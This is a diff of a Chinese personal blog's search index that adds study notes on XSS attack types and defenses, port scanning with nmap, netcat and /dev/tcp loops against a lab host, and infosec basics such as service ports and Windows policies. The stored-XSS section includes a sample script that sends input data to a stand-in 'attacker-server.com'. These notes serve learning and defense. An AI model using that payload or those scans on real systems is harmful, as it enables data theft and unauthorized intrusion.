@@ -689,9 +689,350 @@ d = R(2\frac{\rho _M}{\rho_m})^\frac{1}{3}</script><p><img src="/2023/02/21/%E7%
       </tags>
   </entry>
   <entry>
+    <title>XSS</title>
+    <url>/2023/06/14/XSS/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>跨站脚本攻击原理及实现</p>
+<span id="more"></span>
+<h2 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h2><p>攻击步骤</p>
+<ol>
+<li>攻击者构造包含恶意脚本的URL，并将该URL发送给受害者。</li>
+<li>受害者点击或访问包含恶意脚本的URL。</li>
+<li>受害者的浏览器接收到响应并解析包含恶意脚本的内容。</li>
+<li>恶意脚本在受害者的浏览器中执行，可以窃取用户的敏感信息、篡改页面内容、劫持用户会话等。</li>
+</ol>
+<p>防御方法</p>
+<ol>
+<li>输入验证和过滤：对于用户输入的数据，进行严格的验证和过滤，确保只接受预期的数据类型和格式。可以使用输入过滤器、白名单机制或编码技术来防止恶意脚本的注入。</li>
+<li>输出编码：在将用户输入或其他动态内容输出到HTML页面时，应进行适当的输出编码。使用合适的编码函数（如HTML实体编码）将特殊字符转换为其等价的表示形式，从而防止恶意脚本的执行。</li>
+<li>CSP（Content Security Policy）：通过在HTTP响应头中设置适当的Content Security Policy，可以限制浏览器执行外部脚本的能力，从而减少XSS攻击的风险。</li>
+<li>HTTP-only Cookie：将敏感信息（如会话令牌）存储为HTTP-only Cookie，这样可以防止恶意脚本通过JavaScript获取敏感信息。</li>
+<li>安全开发实践：在开发过程中，遵循安全的编码实践，如避免直接拼接用户输入到HTML页面、使用模板引擎等，以减少XSS攻击的风险。</li>
+<li>安全审计和漏洞扫描：定期进行安全审计和漏洞扫描，以发现和修复潜在的反射型XSS漏洞和其他安全问题。</li>
+</ol>
+<h2 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h2><p>攻击步骤</p>
+<ol>
+<li>攻击者找到目标网站上存在安全漏洞的输入点，如用户提交的评论、留言、论坛帖子等。</li>
+<li>攻击者在输入点处注入包含恶意脚本的内容，通常是HTML、JavaScript或其他前端代码。</li>
+<li>目标网站将恶意脚本存储在数据库或其他存储中，而不对其进行适当的处理或过滤。</li>
+<li>当其他用户访问包含恶意脚本的页面时，恶意脚本会被从存储中检索出来并在其浏览器中执行，从而导致攻击成功。</li>
+</ol>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="comment">// 恶意脚本示例：窃取用户的敏感信息并发送到攻击者的服务器</span></span><br><span class="line">  <span class="keyword">const</span> maliciousScript = <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;script&gt;</span></span><br><span class="line"><span class="string">      const userInput = document.getElementById(&#x27;input&#x27;).value;</span></span><br><span class="line"><span class="string">      const img = new Image();</span></span><br><span class="line"><span class="string">      img.src = &#x27;http://attacker-server.com/steal.php?data=&#x27; + encodeURIComponent(userInput);</span></span><br><span class="line"><span class="string">      document.body.appendChild(img);</span></span><br><span class="line"><span class="string">    &lt;/script&gt;</span></span><br><span class="line"><span class="string">  `</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 注入恶意脚本</span></span><br><span class="line">  <span class="keyword">const</span> userInput = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;input&#x27;</span>).<span class="property">value</span>;</span><br><span class="line">  <span class="keyword">const</span> comment = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line">  comment.<span class="property">innerHTML</span> = userInput + maliciousScript;</span><br><span class="line">  <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;comments&#x27;</span>).<span class="title function_">appendChild</span>(comment);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="dom"><a href="#dom" class="headerlink" title="dom"></a>dom</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">&quot;title&quot;</span>&gt;</span>Welcome<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 恶意脚本示例：篡改页面标题</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> userInput = <span class="built_in">decodeURIComponent</span>(location.<span class="property">hash</span>.<span class="title function_">substr</span>(<span class="number">1</span>)); <span class="comment">// 从URL的哈希部分获取用户输入</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;title&#x27;</span>).<span class="property">innerText</span> = userInput; <span class="comment">// 修改页面标题</span></span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>web攻防</category>
+      </categories>
+      <tags>
+        <tag>XSS</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>端口扫描</title>
+    <url>/2023/06/13/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>nmap、非nmap、伪设备等环境下进行端口扫描</p>
+<span id="more"></span>
+<h1 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h1><h2 id="主机扫描"><a href="#主机扫描" class="headerlink" title="主机扫描"></a>主机扫描</h2><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">nmap</span> -<span class="keyword">sn</span> &lt;目标网段&gt;</span><br></pre></td></tr></table></figure>
+<p>-sn：以ping的方式连接目标网段内所有主机</p>
+<p><img src="/2023/06/13/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230613215713796.png" alt="image-20230613215713796"></p>
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>从上面我们看到该网段有五台主机开放，其中192.168.153.129是目标靶机，扫描靶机中开放端口</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nmap</span> --min-rate <span class="number">10000</span> -p- <span class="number">192.168.153.129</span></span><br></pre></td></tr></table></figure>
+<p>—min-rate：最低速率，如例子中给出10000是一个权衡结果，太快了会不够细致，过慢会导致效率低<br>-p：指定端口，-p-意思是扫描从1-65535所有端口</p>
+<p><img src="/2023/06/13/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230613220228139.png" alt="image-20230613220228139"></p>
+<p>在实战中一般扫描两到三次，如果相同则认为结果可信</p>
+<h3 id="udp扫描"><a href="#udp扫描" class="headerlink" title="udp扫描"></a>udp扫描</h3><figure class="highlight excel"><table><tr><td class="code"><pre><span class="line">nmap --<span class="built_in">min</span>-<span class="built_in">rate</span> <span class="number">10000</span> -sU &lt;目标ip&gt;</span><br></pre></td></tr></table></figure>
+<p>-sU：以UDP的通讯协议来扫描</p>
+<p><img src="/2023/06/13/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230613220431598.png" alt="image-20230613220431598"></p>
+<h3 id="tcp扫描"><a href="#tcp扫描" class="headerlink" title="tcp扫描"></a>tcp扫描</h3><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nmap</span> -sT -sV -O -p5040,<span class="number">5357</span>,<span class="number">137</span> <span class="number">192.168.153.129</span></span><br></pre></td></tr></table></figure>
+<p>-sV：查看版本号<br>-O：查看操作系统</p>
+<p><img src="/2023/06/13/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230613221323853.png" alt="image-20230613221323853"></p>
+<p>可以看到端口以及对应服务以及版本，还有目标靶机的对应操作系统</p>
+<h2 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h2><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nmap</span> --script=&lt;脚本&gt; -p5040,<span class="number">5357</span>,<span class="number">137</span> <span class="number">192.168.153.129</span></span><br></pre></td></tr></table></figure>
+<p>—script=vuln：使用nmap内置脚本对后面端口进行漏洞扫描<br>    vuln：常见漏洞    brute：爆破攻击    auth：鉴权扫描(弱口令)    dos：拒绝服务攻击<br>    exploit：利用安全漏洞    fuzzer：模糊测试    malware：恶意软件检测</p>
+<p><img src="/2023/06/13/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230613224128903.png" alt="image-20230613224128903"></p>
+<p>会使用常规漏洞进行测试，如ms10-054，ms10-061等</p>
+<h1 id="非nmap环境"><a href="#非nmap环境" class="headerlink" title="非nmap环境"></a>非nmap环境</h1><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ping</span> -c <span class="number">1</span> -W <span class="number">1</span> &lt;目标ip&gt;</span><br></pre></td></tr></table></figure>
+<p>-c：发送包数量<br>-W：等待时间</p>
+<h2 id="网段扫描"><a href="#网段扫描" class="headerlink" title="网段扫描"></a>网段扫描</h2><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">for</span> i in &#123;<span class="number">1</span>..<span class="number">254</span>&#125;;do ping -c <span class="number">1</span> -W <span class="number">1</span> xxx.xxx.xxx.$i|grep from ;done</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/06/13/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230613225915379.png" alt="image-20230613225915379"></p>
+<p>使用一个for循环以及通过管道来加一个筛选条件(判断结果是否有from字符)，请注意，筛选结果需要从样本集中分析出结果。如下<br><img src="/2023/06/13/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230613230058846.png" alt="image-20230613230058846"></p>
+<p>可以看到可以ping通和ping不通的主机中返回结果存在不同所以可以分析出成功的地址有from字符串而失败的没有。</p>
+<h1 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h1><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span>.traditional -vv -z <span class="number">192.168.153.130</span> <span class="number">1</span>-<span class="number">65535</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span>|grep refused</span><br></pre></td></tr></table></figure>
+<p>-v：详细信息 -vv更加详细<br>-z：零数据传输</p>
+<p>2&gt;&amp;1：将错误信息重定向为正常信息</p>
+<p>筛选结果同样需要从样本集中提取出来进行使用</p>
+<p><img src="/2023/06/13/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230613233257385.png" alt="image-20230613233257385"></p>
+<p>请注意，虽然使用nmap可以查询到该ip地址，但是直接ping是ping不通的，在nmap扫描的时候已经知道了操作系统是windows，考虑关闭防火墙后成功ping通并获得开放端口</p>
+<h1 id="伪设备"><a href="#伪设备" class="headerlink" title="伪设备"></a>伪设备</h1><h2 id="查看环境"><a href="#查看环境" class="headerlink" title="查看环境"></a>查看环境</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$SHELL</span>&quot;</span></span><br></pre></td></tr></table></figure>
+<p>输入bash切换为bash环境，更加稳定</p>
+<p><img src="/2023/06/13/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230613233114905.png" alt="image-20230613233114905"></p>
+<h2 id="伪设备-1"><a href="#伪设备-1" class="headerlink" title="伪设备"></a>伪设备</h2><p>pseudo device：在linux系统中所有设备都被映射成文件，在磁盘中是文件所以也可以用文件模拟设备</p>
+<h2 id="端口扫描-1"><a href="#端口扫描-1" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i in &#123;<span class="number">1</span>..<span class="number">65535</span>&#125;;<span class="keyword">do</span> (echo&lt;<span class="regexp">/dev/</span>tcp<span class="regexp">/192.168.153.129/</span>$i) &amp;&gt;<span class="regexp">/dev/</span><span class="keyword">null</span> &amp;&amp; printf<span class="string">&quot;the open port is:%d\n&quot;</span><span class="string">&quot;$i&quot;</span> | <span class="keyword">grep</span> -v refuse;done</span><br></pre></td></tr></table></figure>
+<p>&amp;&gt;/dev/null：无论结果是正确还是错误，都丢弃</p>
+<p><img src="/2023/06/13/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230613234524226.png" alt="image-20230613234524226"></p>
+<h2 id="完善（进度）"><a href="#完善（进度）" class="headerlink" title="完善（进度）"></a>完善（进度）</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> &#123;1..65535&#125;;<span class="keyword">do</span> (<span class="built_in">echo</span>&lt;/dev/tcp/192.168.153.129/<span class="variable">$i</span>) &amp;&gt;/dev/null &amp;&amp; <span class="built_in">printf</span> <span class="string">&quot;\nthe open port is:%d\n&quot;</span> <span class="string">&quot;<span class="variable">$i</span>&quot;</span>|| <span class="built_in">printf</span> <span class="string">&quot;.&quot;</span> ;<span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2023/06/13/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230613234901334.png" alt="image-20230613234901334"></p>
+<h1 id="IPV6扫描"><a href="#IPV6扫描" class="headerlink" title="IPV6扫描"></a>IPV6扫描</h1><h2 id="IOXIDResolver"><a href="#IOXIDResolver" class="headerlink" title="IOXIDResolver"></a>IOXIDResolver</h2><p><a href="https://raw.githubusercontent.com/mubix/IOXIDResolver/master/IOXIDResolver.py">raw.githubusercontent.com/mubix/IOXIDResolver/master/IOXIDResolver.py</a></p>
+<h2 id="安装以及赋权"><a href="#安装以及赋权" class="headerlink" title="安装以及赋权"></a>安装以及赋权</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装</span></span><br><span class="line">sudo wget https:<span class="regexp">//</span>raw.githubusercontent.com<span class="regexp">/mubix/</span>IOXIDResolver<span class="regexp">/master/</span>IOXIDResolver.py</span><br><span class="line"><span class="comment"># 授权</span></span><br><span class="line">sudo chmod +x IOXIDResolver</span><br></pre></td></tr></table></figure>
+<h2 id="帮助文档"><a href="#帮助文档" class="headerlink" title="帮助文档"></a>帮助文档</h2><p><img src="/2023/06/13/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230614000712917.png" alt="image-20230614000712917"></p>
+<h2 id="扫描ipv6"><a href="#扫描ipv6" class="headerlink" title="扫描ipv6"></a>扫描ipv6</h2><p><img src="/2023/06/13/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230614000633878.png" alt="image-20230614000633878"></p>
+<h2 id="nmap扫描ipv6端口"><a href="#nmap扫描ipv6端口" class="headerlink" title="nmap扫描ipv6端口"></a>nmap扫描ipv6端口</h2><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo</span> nmap -<span class="number">6</span> --min-rate <span class="number">10000</span> -p- &lt;IPV6地址&gt;</span><br></pre></td></tr></table></figure>
+]]></content>
+  </entry>
+  <entry>
+    <title>信安基础知识</title>
+    <url>/2023/06/10/%E4%BF%A1%E5%AE%89%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>信息安全基础知识</p>
+<span id="more"></span>
+<h2 id="常见协议、中间件默认端口及配置文件"><a href="#常见协议、中间件默认端口及配置文件" class="headerlink" title="常见协议、中间件默认端口及配置文件"></a>常见协议、中间件默认端口及配置文件</h2><div class="table-container">
+<table>
+<thead>
+<tr>
+<th>服务</th>
+<th>端口</th>
+<th>配置文件</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>文件传输协议(FTP)</td>
+<td>21</td>
+<td>linux:/etc/vsftpd.conf<br>windows:</td>
+<td>允许匿名上传、下载、爆破和嗅探操作</td>
+</tr>
+<tr>
+<td>SSH</td>
+<td>22</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>telnet</td>
+<td>23</td>
+<td></td>
+<td>远程连接 爆破、嗅探、弱口令</td>
+</tr>
+<tr>
+<td>SMTP</td>
+<td>25</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>HTTP</td>
+<td>80</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>IIS</td>
+<td>80</td>
+<td></td>
+<td>PUT漏洞、短文件名拆解、RCE、解析漏洞</td>
+</tr>
+<tr>
+<td>apache</td>
+<td>80</td>
+<td></td>
+<td>解析漏洞、目录遍历</td>
+</tr>
+<tr>
+<td>nginx</td>
+<td>80</td>
+<td></td>
+<td>文件解析、目录遍历、CRLF注入、目录穿越</td>
+</tr>
+<tr>
+<td>POP3</td>
+<td>110</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>HTTPS</td>
+<td>443</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td>445</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>MSSQL</td>
+<td>1433</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>Oracle</td>
+<td>1521</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>MYSQL</td>
+<td>3306</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>windows远程桌面服务端口</td>
+<td>3389</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>redis</td>
+<td>6379</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>weblogic</td>
+<td>7701</td>
+<td></td>
+<td>反序列化漏洞、SSRF任意文件上传、war后门文件部署</td>
+</tr>
+<tr>
+<td>apache tomcat</td>
+<td>8080</td>
+<td></td>
+<td>远程代码执行、war后门文件部署</td>
+</tr>
+<tr>
+<td>JBOSS</td>
+<td>8080</td>
+<td></td>
+<td>反序列化漏洞、war后门文件部署</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h2 id="OWASP10"><a href="#OWASP10" class="headerlink" title="OWASP10"></a>OWASP10</h2><h2 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h2><h3 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h3><ul>
+<li><p>matsc：远程桌面管理工具<br>步骤：目标机：控制面板——系统和安全——系统——远程设置——允许远程连接到此计算机。</p>
+<pre><code>       本机：cmd：matsc，填入ip地址和账户凭据
+</code></pre><p><img src="/2023/06/10/%E4%BF%A1%E5%AE%89%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20230620085716723.png" alt="image-20230620085716723" style="zoom:50%;"><img src="/2023/06/10/%E4%BF%A1%E5%AE%89%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20230620085826664.png" alt="image-20230620085826664" style="zoom:50%;"><img src="/2023/06/10/%E4%BF%A1%E5%AE%89%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20230620085858374.png" alt="image-20230620085858374" style="zoom:50%;"></p>
+<p>请注意选择用户中可能存在用户组everyone，这个用户组致使所有人都可以连接到你的主机，按需设置可连接用户或用户组</p>
+<p><img src="/2023/06/10/%E4%BF%A1%E5%AE%89%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20230620085404755.png" alt="image-20230620085404755" style="zoom:50%;"></p>
+</li>
+<li><p>regdit：注册表</p>
+<p><img src="/2023/06/10/%E4%BF%A1%E5%AE%89%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20230620090028078.png" alt="image-20230620090028078" style="zoom:67%;"></p>
+</li>
+<li><p>gpedit.msc：组策略</p>
+<p><img src="/2023/06/10/%E4%BF%A1%E5%AE%89%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20230620090227320.png" alt="image-20230620090227320" style="zoom:67%;"></p>
+<p>其中本地策略、账户策略比较重要，路径为：计算机配置—-windows设置—-安全设置—-本地策略\账户策略<br>账户策略：<img src="/2023/06/10/%E4%BF%A1%E5%AE%89%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20230620090450803.png" alt="image-20230620090450803"><br>密码策略中是密码复杂度、长度等要求，账户锁定策略为登陆失败处置，kerberos策略为域内凭证时间等策略</p>
+<p>本地策略：<img src="/2023/06/10/%E4%BF%A1%E5%AE%89%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20230620090839992.png" alt="image-20230620090839992"><br>本地策略中审核策略是对各个操作行为的审核的开关，也是溯源和跟踪的重要依据，按需开启<br>本地策略中的用户权限分配需按照最小权限原则进行处理<br>安全选项则是对于域、服务器、账户、系统、网络等协议或者功能的安全性设置</p>
+</li>
+</ul>
+<p>gpmc.msc：域策略<br><img src="/2023/06/10/%E4%BF%A1%E5%AE%89%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20230620091508483.png" alt="image-20230620091508483" style="zoom:67%;"></p>
+<p>wf.msc：防火墙设置<img src="/2023/06/10/%E4%BF%A1%E5%AE%89%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20230620091637372.png" alt="image-20230620091637372"></p>
+<h3 id="常见命令"><a href="#常见命令" class="headerlink" title="常见命令"></a>常见命令</h3><p>gpupdate /force：强制刷新策略</p>
+<h3 id="常见知识点"><a href="#常见知识点" class="headerlink" title="常见知识点"></a>常见知识点</h3><h4 id="日志备份"><a href="#日志备份" class="headerlink" title="日志备份"></a>日志备份</h4><p>创新一个空文件，可以看到属性是A，模拟备份ttt文件后，A标记被去除表示文件已备份，修改文件后重新出现A标记<br><img src="/2023/06/10/%E4%BF%A1%E5%AE%89%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20230620091922400.png" alt="image-20230620091922400" style="zoom:50%;"><img src="/2023/06/10/%E4%BF%A1%E5%AE%89%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20230620092235668.png" alt="image-20230620092235668" style="zoom:50%;"><img src="/2023/06/10/%E4%BF%A1%E5%AE%89%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20230620092326731.png" alt="image-20230620092326731" style="zoom:50%;"></p>
+<p><img src="/2023/06/10/%E4%BF%A1%E5%AE%89%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20230620092409811.png" alt></p>
+<p>日志备份原理：遍历需要备份的文件，查看文件属性是否是A，是A则进行备份后完成将属性转化成N，即进行差异备份</p>
+<p>事件查看器</p>
+<p>更改远程连接端口</p>
+<p>NFTS权限</p>
+<p>访问控制与访问控制列表</p>
+<p>隐藏账户处置</p>
+<h2 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h2><h3 id="判断操作系统"><a href="#判断操作系统" class="headerlink" title="判断操作系统"></a>判断操作系统</h3><ul>
+<li>修改url参数，比如改成大写，正常的是windows，不正常的是linux</li>
+<li>使用ping命令，linux返回的TTL值一般比windows的值小一些，一般以100为划分线</li>
+</ul>
+<h3 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h3><div class="table-container">
+<table>
+<thead>
+<tr>
+<th>服务</th>
+<th>操作系统</th>
+<th>命令</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>查看端口使用情况</td>
+<td>windows</td>
+<td>netstat -ano</td>
+</tr>
+<tr>
+<td></td>
+<td>linux</td>
+<td>netstat -tuln</td>
+</tr>
+<tr>
+<td>查看当前运行的服务</td>
+<td>windows</td>
+<td>net start</td>
+</tr>
+<tr>
+<td></td>
+<td>linux</td>
+<td>service —status-all \</td>
+<td>grep running</td>
+</tr>
+<tr>
+<td>下载</td>
+<td>windows</td>
+<td>powershell curl -o “输出文件名” “下载路径”</td>
+</tr>
+<tr>
+<td></td>
+<td>linux</td>
+<td>wget -o 文件名 URL</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+</div>
+<h2 id="常用工具-1"><a href="#常用工具-1" class="headerlink" title="常用工具"></a>常用工具</h2><h3 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h3><h4 id="过滤规则"><a href="#过滤规则" class="headerlink" title="过滤规则"></a>过滤规则</h4><div class="table-container">
+<table>
+<thead>
+<tr>
+<th>操作</th>
+<th>代码</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>过滤ip</td>
+<td>源ip：ip.src eq ip<br>目的ip：ip.dst eq ip</td>
+</tr>
+<tr>
+<td>过滤端口</td>
+<td>tcp.port eq 80//源和目标都显示<br>tcp.dstport == ip 或 tcp.srcport == ip<br>tcp.port &gt;= 1 and tcp.port &lt;= 80</td>
+</tr>
+<tr>
+<td>过滤协议</td>
+<td>输入协议名，如tcp、udp、arp、icmp等<br>排除协议：如排除arp包，如!arp 或 not arp</td>
+</tr>
+<tr>
+<td>过滤MAC</td>
+<td>eth.dst(src) == 目标(源)MAC</td>
+</tr>
+<tr>
+<td>http模式过滤</td>
+<td>http.request.method == “GET”(“POST”)<br>http.request.uri == “/img/1.jpg”<br>http contains “HTTP/1.”</td>
+</tr>
+<tr>
+<td>TCP参数过滤</td>
+</tr>
+</tbody>
+</table>
+</div>
+]]></content>
+  </entry>
+  <entry>
     <title>julia构建区块链</title>
     <url>/2023/04/24/julia%E6%9E%84%E5%BB%BA%E5%8C%BA%E5%9D%97%E9%93%BE/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><figure class="highlight julia"><table><tr><td class="code"><pre><span class="line">JSON.print(<span class="literal">stdout</span>, blockchain.chain[<span class="keyword">end</span>], <span class="number">4</span>)</span><br></pre></td></tr></table></figure>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>完成区块链构建项目中一些冷不丁的小知识</p>
+<span id="more"></span>
+<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">JSON.<span class="built_in">print</span>(<span class="built_in">stdout</span>, blockchain.chain[<span class="keyword">end</span>], <span class="number">4</span>)</span><br></pre></td></tr></table></figure>
 <p>这个函数将 <code>blockchain.chain</code> 数组的最后一个区块（也就是区块链中最新的区块）以格式化的 JSON 字符串的形式打印到控制台。具体来说，<code>JSON.print()</code> 函数的第一个参数 <code>stdout</code> 表示输出到标准输出流（通常是控制台），第二个参数 <code>blockchain.chain[end]</code> 表示要打印的数据，第三个参数 <code>4</code> 表示缩进层级为 4。</p>
 <p>通过这个函数，我们可以查看当前最新的区块的详细信息，包括区块头、交易数据等。这在调试和测试区块链时非常有用。</p>
 <figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">!(isnothing(prev_hash)) ? prev_hash : hash<span class="constructor">_block(<span class="params">blockchain</span>.<span class="params">chain</span>[<span class="params">end</span>])</span></span><br></pre></td></tr></table></figure>
@@ -714,6 +1055,12 @@ d = R(2\frac{\rho _M}{\rho_m})^\frac{1}{3}</script><p><img src="/2023/02/21/%E7%
 <figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">blockchain = <span class="built_in">Blockchain</span>(<span class="selector-attr">[]</span>, <span class="selector-attr">[]</span>, <span class="built_in">Set</span>())</span><br></pre></td></tr></table></figure>
 <p>这段代码创建了一个空的 <code>Blockchain</code> 对象，其中参数包括三个空数组和一个空的集合，分别对应该区块链的链、当前交易列表、已知节点集合。<br>在这个实现中，已知节点集合使用<code>Set()</code>主要是为了避免在集合中出现重复的节点。<code>Set()</code>是一种集合数据结构，它只包含不同的元素，每个元素只出现一次，而不会有重复元素。这样做可以确保我们的节点集合不会包含重复的节点，从而避免在节点之间传输信息时出现重复的数据。同时，<code>Set()</code>也具有高效的添加、删除和查找元素的操作，使得我们可以方便地维护我们的节点集合。</p>
 ]]></content>
+      <categories>
+        <category>区块链</category>
+      </categories>
+      <tags>
+        <tag>区块链</tag>
+      </tags>
   </entry>
   <entry>
     <title>python学习</title>
@@ -751,14 +1098,13 @@ d = R(2\frac{\rho _M}{\rho_m})^\frac{1}{3}</script><p><img src="/2023/02/21/%E7%
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>leetcode练习题</p>
 <span id="more"></span>
